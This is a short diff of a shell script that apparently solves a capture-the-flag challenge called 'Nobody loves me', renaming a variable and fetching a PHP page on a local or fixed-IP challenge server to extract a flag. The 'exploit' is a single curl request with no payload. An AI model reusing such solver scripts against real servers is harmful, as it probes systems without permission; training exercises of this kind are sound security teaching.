@@ -3,17 +3,17 @@ PORT=8081
 
 if [[ $1 == "local" ]]
 then
-    remote='http://127.0.0.1:'$PORT
+    url='http://127.0.0.1:'$PORT
 elif [[ $1 == "remote" ]] && [[ -z $2 ]] 
 then
-    remote='http://141.85.224.115:'$PORT
+    url='http://141.85.224.115:'$PORT
 else
-    remote=$1':'$2
+    url=$1':'$2
 fi
 
 # Nobody loves me
 echo "Start exploit for Nobody loves me"
-remote=$remote'/nobody-loves-me/ernq-svyr.php'
-flag=$(curl -s $remote | grep -o "SSS{.*}")
+url=$url'/nobody-loves-me/ernq-svyr.php'
+flag=$(curl -s $url | grep -o "SSS{.*}")
 echo "Flag is $flag"
 echo "----------------------------"
